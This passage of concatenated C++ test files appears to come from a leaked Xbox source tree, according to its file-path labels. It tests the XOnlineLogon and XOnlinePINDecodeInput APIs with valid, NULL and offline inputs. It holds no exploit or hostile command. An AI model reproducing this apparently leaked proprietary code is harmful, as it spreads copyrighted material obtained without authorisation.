	DWORD				dwWorkFlags		= 0;

	XONLINE_USER		aUsers[XONLINE_MAX_STORED_ONLINE_USERS];
	XONLINETASK_HANDLE	taskHandle = NULL; 
    XONLINE_SERVICE_INFO serviceInfo;

	HANDLE				hEvent = CreateEvent( NULL, TRUE, TRUE, NULL );

	CHECKRUN( StartNetwork() );

	if ( NULL == hEvent )
	{
		hr = E_FAIL;
	}


	//
	// cycle through the different combination of users
	//

	for ( DWORD i = 0; i < 0x0000000F && SUCCEEDED( hr ); i++ )
	{
		ZeroMemory( aUsers, sizeof( aUsers ) );

		// populate the user list
        CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) aUsers, XONLINE_MAX_HD_ONLINE_USERS ) );
        dwNumUsers = XONLINE_MAX_STORED_ONLINE_USERS;

		//
		// Zero out the proper users
		//

		for ( DWORD dwMask = 0x00000008, dwShift = 0; 0 != dwMask && SUCCEEDED( hr ); dwMask >>= 1, dwShift++ )
		{
			if ( i & dwMask )
			{
				ZeroMemory( aUsers + dwShift, sizeof( XONLINE_USER ) );
			}
		}

		//
		// go through the different services
		//

		for ( DWORD j = 0; j < NUMELEMS( SERVICES ) && SUCCEEDED( hr ); j++ )
		{
			//
			// logon
			//

			CHECKRUN( XOnlineLogon( aUsers, static_cast<DWORD*> (&(SERVICES[0][j])), NUM_SERVICES[j], hEvent, &taskHandle ) );

			//
			// make sure the taskhandle came back
			//

			if ( SUCCEEDED( hr ) )
			{
				hr = NULL == taskHandle ? E_FAIL : S_OK;
			}

            if (SUCCEEDED(hr))
            {
                hr = WaitForLogon(taskHandle, hEvent);
            }

            hr = (XONLINE_S_LOGON_CONNECTION_ESTABLISHED == hr) ? S_OK : E_FAIL;

            //
			// go through each serice, and verify
			//

			for ( DWORD k = 0; k < NUM_SERVICES[j] && SUCCEEDED( hr ); k++ )
			{
				//
				// make sure the hr returned is S_OK
				//

				CHECKRUN( XOnlineGetServiceInfo(SERVICES[j][k], &serviceInfo) );

				//
				// make sure the handle is good
				//

				if ( SUCCEEDED( hr ) && serviceInfo.dwServiceID != SERVICES[j][k] )
				{
					hr = E_FAIL;

				}
			}
            
            if (SUCCEEDED(hr) && taskHandle != NULL)
            {
                hr = XOnlineTaskClose( taskHandle );
			    taskHandle = NULL;
            }
		}
	}


	CHECKRUN( CloseNetwork() );

    //
	// close the handle
	//

	if ( SUCCEEDED(hr) && hEvent )
	{
		CloseHandle( hEvent );
		hEvent = NULL;
	}

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineLogon_VALID_USER_VALID_SERVICE_NO_INTERNET
 *
 *	Description:
 *		Perform Online logon when no internet is available
 *
 *	Input: 
 *		PUsers - valid array of users
 *		PServices - valid array of services
 *		CServices - the corresponding count of services
 *		Hevent - a valid event
 *		PHandle - a valid pointer
 *
 *	System State:
 *			Connected to Internet: FALSE
 *
 *	Verify:
 *		Return value is E_XXXXX
 *		Value in pHandle (*pHandle) is NULL
 *		Values in pServices are not valid
 *
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineLogon_VALID_USER_VALID_SERVICE_NO_INTERNET( void )
{
    HRESULT             hr              = S_OK;

	DWORD				dwNumUsers		= 0;
	DWORD				dwWorkFlags		= 0;

	XONLINE_USER		aUsers[XONLINE_MAX_STORED_ONLINE_USERS];
	XONLINETASK_HANDLE	taskHandle = NULL; 

	HANDLE				hEvent = CreateEvent( NULL, TRUE, TRUE, NULL );

	if ( NULL == hEvent )
	{
		hr = E_FAIL;
	}


	ZeroMemory( aUsers, sizeof( aUsers ) );

	// populate the user list
    CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) aUsers, XONLINE_MAX_HD_ONLINE_USERS ) );
    dwNumUsers = XONLINE_MAX_STORED_ONLINE_USERS;

	//
	// make sure the correct number were loaded
	//

	if ( XONLINE_MAX_STORED_ONLINE_USERS != dwNumUsers )
	{
		hr = E_FAIL;
	}

	CHECKRUN( SUCCEED_ON_FAIL( XOnlineLogon( aUsers, SERVICES[0], NUM_SERVICES[0], hEvent, &taskHandle ), static_cast<HRESULT>(0xc000005e) ) );


	if ( hEvent )
	{
		CloseHandle( hEvent );
		hEvent = NULL;
	}

    return hr;
}

/****************************************************************************
 *
 *  XOnlineLogon_VALID_USERS_0_SERVICES
 *
 *	Description:
 *		Perform Online logon when no services are selected
 *
 *	Input: 
 *		PUsers - valid array of users
 *		PServices - array of 0 services
 *		CServices - 0
 *		Hevent - a valid event
 *		PHandle - a valid pointer
 *
 *	System State:
 *			Connected to Internet: TRUE
 *
 *	Verify:
 *		Return value is E_XXXXX
 *		Value in pHandle (*pHandle) is NULL
 *		Values in pServices are not valid
 *
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineLogon_VALID_USERS_0_SERVICES( void )
{
    HRESULT             hr              = S_OK;

	DWORD				dwNumUsers		= 0;
	DWORD				dwWorkFlags		= 0;

	XONLINE_USER		aUsers[XONLINE_MAX_STORED_ONLINE_USERS];
	XONLINETASK_HANDLE	taskHandle = NULL; 

	HANDLE				hEvent = CreateEvent( NULL, TRUE, TRUE, NULL );

	if ( NULL == hEvent )
	{
		hr = E_FAIL;
	}

	ZeroMemory( aUsers, sizeof( aUsers ) );

	// populate the user list
    CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) aUsers, XONLINE_MAX_HD_ONLINE_USERS ) );
    dwNumUsers = XONLINE_MAX_STORED_ONLINE_USERS;


	//
	// make sure the correct number were loaded
	//

	if ( XONLINE_MAX_HD_ONLINE_USERS != dwNumUsers )
	{
		hr = E_FAIL;
	}

	//
	// logon with 0 services
	//

	CHECKRUN( XOnlineLogon( aUsers, NULL, 0, hEvent, &taskHandle ) );
    CHECKRUN( WaitForLogon( taskHandle, hEvent ) );

	//
	// close the handle
	//

	if ( hEvent )
	{
		CloseHandle( hEvent );
		hEvent = NULL;
	}

    return hr;
}

/****************************************************************************
 *
 *  XOnlineLogon_NULL_USER
 *
 *	Description:
 *		Make sure Online logon can handle a NULL user
 *
 *	Input: 
 *		PUsers - NULL
 *		PServices - valid array of services
 *		CServices - the corresponding count of services
 *		Hevent - a valid event
 *		PHandle - a valid pointer
 *
 *	System State:
 *		Connected to Internet: N/A
 *
 *	Verify:
 *		Return value is E_XXXXX
 *		Value in pHandle (*pHandle) is NULL
 *		Values in pServices are not valid
 *
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineLogon_NULL_USER( void )
{
    HRESULT             hr              = S_OK;

	DWORD				dwNumUsers		= 0;
	DWORD				dwWorkFlags		= 0;

	XONLINETASK_HANDLE	taskHandle = NULL; 

	HANDLE				hEvent = CreateEvent( NULL, TRUE, TRUE, NULL );

	if ( NULL == hEvent )
	{
		hr = E_FAIL;
	}


	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// logon with 0 services
	//

	CHECKRUN( SUCCEED_ON_FAIL( XOnlineLogon( NULL, SERVICES[0], 0, hEvent, &taskHandle ), E_INVALIDARG ) );

	//
	// close the handle
	//

	if ( hEvent )
	{
		CloseHandle( hEvent );
		hEvent = NULL;
	}

	//
	// clear the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

    return hr;
}

/****************************************************************************
 *
 *  XOnlineLogon_NULL_SERVICE
 *
 *	Description:
 *		Make sure Online logon can handle a NULL service
 *
 *	Input: 
 *		PUsers - a valid array of users
 *		PServices - NULL
 *		CServices - the corresponding count of services
 *		Hevent - a valid event
 *		PHandle - a valid pointer
 *
 *	System State:
 *			Connected to Internet: N/A
 *
 *	Verify:
 *		Return value is E_XXXXX
 *		Value in pHandle (*pHandle) is NULL
 *
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineLogon_NULL_SERVICE( void )
{
    HRESULT             hr              = S_OK;

	DWORD				dwNumUsers		= 0;
	DWORD				dwWorkFlags		= 0;

	XONLINE_USER		aUsers[XONLINE_MAX_STORED_ONLINE_USERS];
	XONLINETASK_HANDLE	taskHandle = NULL; 

	HANDLE				hEvent = CreateEvent( NULL, TRUE, TRUE, NULL );

	if ( NULL == hEvent )
	{
		hr = E_FAIL;
	}

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	ZeroMemory( aUsers, sizeof( aUsers ) );

	// populate the user list
    CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) aUsers, XONLINE_MAX_HD_ONLINE_USERS ) );
    dwNumUsers = XONLINE_MAX_STORED_ONLINE_USERS;

	//
	// make sure the correct number were loaded
	//

	if ( XONLINE_MAX_HD_ONLINE_USERS != dwNumUsers )
	{
		hr = E_FAIL;
	}

	//
	// logon with NULL service pointer
	//

	CHECKRUN( SUCCEED_ON_FAIL( XOnlineLogon( aUsers, NULL, NUM_SERVICES[0], hEvent, &taskHandle ), E_INVALIDARG ) );

	if ( hEvent )
	{
		CloseHandle( hEvent );
		hEvent = NULL;
	}

	//
	// clear the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

    return hr;
}

/****************************************************************************
 *
 *  XOnlineLogon_NULL_EVENT
 *
 *	Description:
 *		Make sure Online logon can handle a NULL handle
 *
 *	Input: 
 *		PUsers - valid array of users
 *		PServices - valid array of services
 *		CServices - the corresponding count of services
 *		Hevent - NULL
 *		PHandle - a valid pointer
 *
 *	System State:
 *			Connected to Internet: N/A
 *
 *	Verify:
 *		Return value is E_XXXXX
 *		Value in pHandle (*pHandle) is NULL
 *		Values in pServices are not valid
 *
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineLogon_NULL_EVENT( void )
{
    HRESULT             hr              = S_OK;

	DWORD				dwNumUsers		= 0;
	DWORD				dwWorkFlags		= 0;

	XONLINE_USER		aUsers[XONLINE_MAX_STORED_ONLINE_USERS];
	XONLINETASK_HANDLE	taskHandle = NULL; 

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	ZeroMemory( aUsers, sizeof( aUsers ) );

	// populate the user list
    CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) aUsers, XONLINE_MAX_HD_ONLINE_USERS ) );
    dwNumUsers = XONLINE_MAX_HD_ONLINE_USERS;

	//
	// logon with NULL EVENT
	//

	CHECKRUN( XOnlineLogon( aUsers, SERVICES[0], NUM_SERVICES[0], NULL, &taskHandle ) );
    if (SUCCEEDED(hr))
    {
        do
        {
            hr = XOnlineTaskContinue(taskHandle);
        } while (XONLINETASK_S_RUNNING == hr);
    }

	//
	// clear the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

    return hr;
}

/****************************************************************************
 *
 *  XOnlineLogon_NULL_XONLINE_HANDLE
 *
 *
 *	Description:
 *		Make sure Online logon can handle a NULL handle pointer
 *
 *	Input: 
 *		PUsers - valid array of users
 *		PServices - valid array of services
 *		CServices - the corresponding count of services
 *		Hevent - a valid event
 *		PHandle - NULL
 *
 *	System State:
 *			Connected to Internet: N/A
 *
 *	Verify:
 *		Return value is E_XXXXX
 *			Values in pServices are not valid
 *
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineLogon_NULL_XONLINE_HANDLE( void )
{
    HRESULT             hr              = S_OK;

	DWORD				dwNumUsers		= 0;
	DWORD				dwWorkFlags		= 0;

	XONLINE_USER		aUsers[XONLINE_MAX_STORED_ONLINE_USERS];

	HANDLE				hEvent = CreateEvent( NULL, TRUE, TRUE, NULL );

	if ( NULL == hEvent )
	{
		hr = E_FAIL;
	}

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// start the network
	//

	CHECKRUN( StartNetwork() );

	//
	// zero out the users
	//

	ZeroMemory( aUsers, sizeof( aUsers ) );

	// populate the user list
    CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) aUsers, XONLINE_MAX_HD_ONLINE_USERS ) );
    dwNumUsers = XONLINE_MAX_HD_ONLINE_USERS;

    //
	// logon with NULL HANDLE
	//

	CHECKRUN( SUCCEED_ON_FAIL( XOnlineLogon( aUsers, SERVICES[0], 0, hEvent, NULL ), E_INVALIDARG ) );

	//
	// close the handle
	//

	if ( hEvent )
	{
		CloseHandle( hEvent );
		hEvent = NULL;
	}

	//
	// clear the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

    return hr;
}
/****************************************************************************
 *
 *  XOnlineLogon_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlineLogon tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineLogon_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;
    
    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //
    
#ifdef CODE_COVERAGE
    
#endif // CODE_COVERAGE
    
    SETLOG( LogHandle, "davidhef", "Online", "XOnlineLogon", "BASIC_TEST" );
    EXECUTE( XOnlineLogon_BASIC_TEST() );
    
    if (!BVTMode())
    {
        // Corner test cases.
        SETLOG( LogHandle, "davidhef", "Online", "XOnlineLogon", "CORNER_CASES" );
        EXECUTE( XOnlineLogon_CORNER_CASES() );

        //
        // Test XOnlineLogon with all combinations of users and services
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineLogon", "X_USERS_Y_SERVICES_HAS_INTERNET" );
        EXECUTE( XOnlineLogon_X_USERS_Y_SERVICES_HAS_INTERNET() );
        
        //
        // Test XOnlineLogon with a valid user and valid service but no internet
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineLogon", "VALID_USER_VALID_SERVICE_NO_INTERNET" );
        EXECUTE( XOnlineLogon_VALID_USER_VALID_SERVICE_NO_INTERNET() );
        
        //
        // Test XOnlineLogon with 0 services
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineLogon", "VALID_USERS_0_SERVICES" );
        EXECUTE( XOnlineLogon_VALID_USERS_0_SERVICES() );
        
        //
        // Test XOnlineLogon with a null user
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineLogon", "NULL_USER" );
        EXECUTE( XOnlineLogon_NULL_USER() );
        
        //
        // Test XOnlineLogon with a null service
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineLogon", "NULL_SERVICE" );
        EXECUTE( XOnlineLogon_NULL_SERVICE() );
        
        //
        // Test XOnlineLogon with a null event
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineLogon", "NULL_EVENT" );
        EXECUTE( XOnlineLogon_NULL_EVENT() );
        
        //
        // Test XOnlineLogon with a null handle
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineLogon", "NULL_XONLINE_HANDLE" );
        EXECUTE( XOnlineLogon_NULL_XONLINE_HANDLE() );
    }
}

/****************************************************************************
 *
 *  XOnlineLogon_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineLogon_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlineLogon_StartTest( NULL );
    XOnlineLogon_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlineLogon )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlineLogon )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlineLogon_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlineLogon_EndTest )
END_EXPORT_TABLE( XOnlineLogon )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlinePINDecodeInput\XOnlinePINDecodeInput.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlinePINDecodeInput.cpp
 *  Content:    XOnlinePINDecodeInput tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/24/01    danrose Created to test Xbox XOnlinePINDecodeInput
 *
 ****************************************************************************/

#include <XOnlineAuthUtil.h>
#include "XOnlinePINDecodeInput.h"

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 * The Global online param check flag
 *
 ****************************************************************************/

extern BOOL g_ParamCheckReturnsError;

/****************************************************************************
 *
 *  XOnlinePINDecodeInput_VALID_HANDLE_CHANGED_STATE_VALID_PBYTE
 *
 *	Description:
 *		Decode PIN Input after an input change for each possible button press
 *
 *	Input: 
 *		Handle - a valid handle value
 *		PInputState - a filled in XINPUT_STATE with changes
 *		PINByte - a valid byte pointer
 *
 *	System State:
 *		None
 *
 *	Verify:
 *		Return value is S_OK
 *		BYTE value returned is correct one for input 
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlinePINDecodeInput_VALID_HANDLE_CHANGED_STATE_VALID_PBYTE( void )
{
    HRESULT             hr              = S_OK;

	static const DWORD	NUM_BUTTONS		= 10;

	XPININPUTHANDLE		inputHandle		= NULL;
	XINPUT_STATE		inputState;
	BYTE				byVals[NUM_BUTTONS];

	//
	// Zero out the byte values
	//

	ZeroMemory( byVals, sizeof( byVals ) );

	//
	// Zero out the input state
	//
	
	ZeroMemory( &inputState, sizeof( XINPUT_STATE ) );

	//
	// create the pin input handle
	//

	CHECKRUNHANDLE( inputHandle, XOnlinePINStartInput( &inputState ) );
	
	//
	// cycle through each possible input value
	//

	for ( DWORD i = 0; i < NUM_BUTTONS && SUCCEEDED( hr ); i++ )
	{
		//
		// Zero out the input state
		//
		
		ZeroMemory( &inputState, sizeof( XINPUT_STATE ) );

		//
		// fill in the current packet
		//

		inputState.dwPacketNumber = i * 2;

		//
		// fill in the inputState based on the loop counter
		//

		switch( i )
		{
			case 0:
				inputState.Gamepad.wButtons = XINPUT_GAMEPAD_DPAD_UP;
				break;

			case 1:
				inputState.Gamepad.wButtons = XINPUT_GAMEPAD_DPAD_DOWN;
				break;

			case 2:
				inputState.Gamepad.wButtons = XINPUT_GAMEPAD_DPAD_LEFT;
				break;

			case 3:
				inputState.Gamepad.wButtons = XINPUT_GAMEPAD_DPAD_RIGHT;
				break;

			case 4:
				inputState.Gamepad.bAnalogButtons[XINPUT_GAMEPAD_X] = 255;
				break;

			case 5:
				inputState.Gamepad.bAnalogButtons[XINPUT_GAMEPAD_Y] = 255;
				break;

			case 6:
				inputState.Gamepad.bAnalogButtons[XINPUT_GAMEPAD_BLACK] = 255;
				break;

			case 7:
				inputState.Gamepad.bAnalogButtons[XINPUT_GAMEPAD_WHITE] = 255;
				break;

			case 8:
				inputState.Gamepad.bAnalogButtons[XINPUT_GAMEPAD_LEFT_TRIGGER] = 255;
				break;

			case 9:
				inputState.Gamepad.bAnalogButtons[XINPUT_GAMEPAD_RIGHT_TRIGGER] = 255;
				break;
		}

		//
		// decode this byte
		//

		CHECKRUN( XOnlinePINDecodeInput( inputHandle, &inputState, byVals + i ) );

		//
		// Zero out the input state
		//
		
		ZeroMemory( &inputState, sizeof( XINPUT_STATE ) );

		//
		// update the packet
		//

		inputState.dwPacketNumber = i * 2 + 1;

		//
		// simulate clearing of a button
		//

		CHECKRUN( XOnlinePINDecodeInput( inputHandle, &inputState, byVals + i ) );
	}

	//
	// cycle through, and verify
	//

	for ( DWORD i = 0; i < NUM_BUTTONS && SUCCEEDED( hr ); i++ )
	{
		if ( i + 1 != byVals[i] )
		{
			hr = E_FAIL;
		}
	}

	//
	// Destroy the input handle
	//

	RUN( XOnlinePINEndInput( inputHandle ) );

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlinePINDecodeInput_VALID_HANDLE_UNCHANGED_STATE_VALID_PBYTE
 *
 *	Description:
 *		Decode PIN Input after no input change
 *
 *	Input: 
 *		Handle - a valid handle value
 *		PInputState - a filled in XINPUT_STATE out changes
 *		PINByte - a valid byte pointer
 *
 *	System State:
 *		None
 * 
 *	Verify:
 *		Return value is S_FALSE
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlinePINDecodeInput_VALID_HANDLE_UNCHANGED_STATE_VALID_PBYTE( void )
{
    HRESULT             hr              = S_OK;

	XPININPUTHANDLE		inputHandle		= NULL;
	XINPUT_STATE		inputState;
	BYTE				byVals[12];

	//
	// Zero out the byte values
	//

	ZeroMemory( byVals, sizeof( byVals ) );

	//
	// Zero out the input state
	//
	
	ZeroMemory( &inputState, sizeof( XINPUT_STATE ) );

	//
	// create the pin input handle
	//

	CHECKRUNHANDLE( inputHandle, XOnlinePINStartInput( &inputState ) );

	//
	// decode the pin input
	//

	CHECKRUN( XOnlinePINDecodeInput( inputHandle, &inputState, byVals ) );

	//
	// Destroy the input handle
	//

	RUN( XOnlinePINEndInput( inputHandle ) );

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlinePINDecodeInput_NULL_HANDLE_VALID_STATE_VALID_PBYTE
 *
 *	Description:
 *		Make sure Decode PIN input handles a NULL handle
 *
 *	Input: 
 *		Handle - NULL
 *		PInputState - a filled in XINPUT_STATE
 *		PINByte - a valid byte pointer
 *
 *	System State:
 *		None
 *
 *	Verify:
 *		Return value is E_XXXXX
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlinePINDecodeInput_NULL_HANDLE_VALID_STATE_VALID_PBYTE( void )
{
    HRESULT             hr              = S_OK;

	XPININPUTHANDLE		inputHandle		= NULL;
	XINPUT_STATE		inputState;
	BYTE				byVals[12];

	//
	// Zero out the byte values
	//

	ZeroMemory( byVals, sizeof( byVals ) );

	//
	// Zero out the input state
	//
	
	ZeroMemory( &inputState, sizeof( XINPUT_STATE ) );

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// decode the pin input
	//

	CHECKRUN( SUCCEED_ON_FAIL( XOnlinePINDecodeInput( inputHandle, &inputState, byVals ), E_INVALIDARG ) );

	//
	// reset the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlinePINDecodeInput_VALID_HANDLE_VALID_STATE_NULL_PBYTE
 *
 *	Description:
 *		Make sure Decode PIN Input handles NULL pByte pointer
 *
 *	Input: 
 *		Handle - a valid handle value
 *		PInputState - a filled in XINPUT_STATE
 *		PINByte - NULL
 *
 *	System State:
 *		None
 *
 *	Verify:
 *		Return value is E_XXXXX
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlinePINDecodeInput_VALID_HANDLE_VALID_STATE_NULL_PBYTE( void )
{
    HRESULT             hr              = S_OK;

	XPININPUTHANDLE		inputHandle		= NULL;
	XINPUT_STATE		inputState;

	//
	// Zero out the input state
	//
	
	ZeroMemory( &inputState, sizeof( XINPUT_STATE ) );

	//
	// create the pin input handle
	//

	CHECKRUNHANDLE( inputHandle, XOnlinePINStartInput( &inputState ) );

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// decode the pin input
	//

	CHECKRUN( SUCCEED_ON_FAIL( XOnlinePINDecodeInput( inputHandle, &inputState, NULL ), E_INVALIDARG ) );

	//
	// reset the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

	//
	// Destroy the input handle
	//

	RUN( XOnlinePINEndInput( inputHandle ) );
    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlinePINDecodeInput_VALID_HANDLE_NULL_STATE_VALID_PBYTE
 *
 *	Description:
 *		Make sure Decode PIN input handles a NULL state pointer
 * 
 *	Input: 
 *		Handle - a valid handle value
 *		PInputState - NULL
 *		PINByte - a valid byte pointer
 *
 *	System State:
 *			None
 *
 *	Verify:
 *		Return value is E_XXXXXX
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlinePINDecodeInput_VALID_HANDLE_NULL_STATE_VALID_PBYTE( void )
{
    HRESULT             hr              = S_OK;

	XPININPUTHANDLE		inputHandle		= NULL;
	XINPUT_STATE		inputState;
	BYTE				byVals[12];

	//
	// Zero out the byte values
	//

	ZeroMemory( byVals, sizeof( byVals ) );

	//
	// Zero out the input state
	//
	
	ZeroMemory( &inputState, sizeof( XINPUT_STATE ) );

	//
	// create the pin input handle
	//

	CHECKRUNHANDLE( inputHandle, XOnlinePINStartInput( &inputState ) );

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// decode the pin input
	//

	CHECKRUN( SUCCEED_ON_FAIL( XOnlinePINDecodeInput( inputHandle, NULL, byVals ), E_INVALIDARG ) );

	//
	// reset the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

	//
	// Destroy the input handle
	//

	RUN( XOnlinePINEndInput( inputHandle ) );

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlinePINDecodeInput_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlinePINDecodeInput tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlinePINDecodeInput_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

	CHECKRUN( StartNetwork() );

    //
    // Test XOnlinePINDecodeInput in the mannor it was meant to be called (changed state)
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlinePINDecodeInput", "VALID_HANDLE_CHANGED_STATE_VALID_PBYTE" );
    EXECUTE( XOnlinePINDecodeInput_VALID_HANDLE_CHANGED_STATE_VALID_PBYTE() );

    //
    // Test XOnlinePINDecodeInput in the mannor it was meant to be called (unchanged state)
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlinePINDecodeInput", "VALID_HANDLE_UNCHANGED_STATE_VALID_PBYTE" );
    EXECUTE( XOnlinePINDecodeInput_VALID_HANDLE_UNCHANGED_STATE_VALID_PBYTE() );

    //
    // Test XOnlinePINDecodeInput with a null handle
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlinePINDecodeInput", "NULL_HANDLE_VALID_STATE_VALID_PBYTE" );
    EXECUTE( XOnlinePINDecodeInput_NULL_HANDLE_VALID_STATE_VALID_PBYTE() );

    //
    // Test XOnlinePINDecodeInput with a null pByte
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlinePINDecodeInput", "VALID_HANDLE_VALID_STATE_NULL_PBYTE" );
    EXECUTE( XOnlinePINDecodeInput_VALID_HANDLE_VALID_STATE_NULL_PBYTE() );

    //
    // Test XOnlinePINDecodeInput with a null state
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlinePINDecodeInput", "VALID_HANDLE_NULL_STATE_VALID_PBYTE" );
    EXECUTE( XOnlinePINDecodeInput_VALID_HANDLE_NULL_STATE_VALID_PBYTE() );

	CHECKRUN( CloseNetwork() );
}

/****************************************************************************
 *
 *  XOnlinePINDecodeInput_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlinePINDecodeInput_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlinePINDecodeInput_StartTest( NULL );
    XOnlinePINDecodeInput_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlinePINDecodeInput )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlinePINDecodeInput )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlinePINDecodeInput_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlinePINDecodeInput_EndTest )
END_EXPORT_TABLE( XOnlinePINDecodeInput )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineLogon\XOnlineLogon.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineLogon.h
 *  Content:    XOnlineLogon utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineLogon
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xlog.h>
#include <macros.h>
#include <XOnlineAuthUtil.h>
#include <OnlineAccounts.h>
